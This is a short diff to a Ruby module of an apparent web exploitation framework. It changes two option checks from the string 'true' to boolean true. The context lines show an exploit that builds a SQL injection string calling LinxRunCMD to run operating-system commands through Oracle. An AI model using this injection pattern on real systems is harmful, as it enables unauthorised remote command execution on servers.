@@ -149,7 +149,7 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
     command = datahash['COMMAND']
     cmd_call = "select%20LinxRunCMD(\'#{command}\')%20from%20dual"
     
-    if datahash['VERIFY'] == 'true'
+    if datahash['VERIFY'] == true
     #check if the injection string is valid
       prnt_gen("Checking if the URL is valid #{rurl}#{path}#{dad}#{injection}#{url_dba}#{sql_check}")
       
@@ -188,7 +188,7 @@ class WebXploit < WXf::WXfmod_Factory::Auxiliary
       if dba == true
         return
       end
-    elsif datahash['JAVASETUP'] == 'true'
+    elsif datahash['JAVASETUP'] == true
       #just do the java cmd stuff
       
       #create the java library
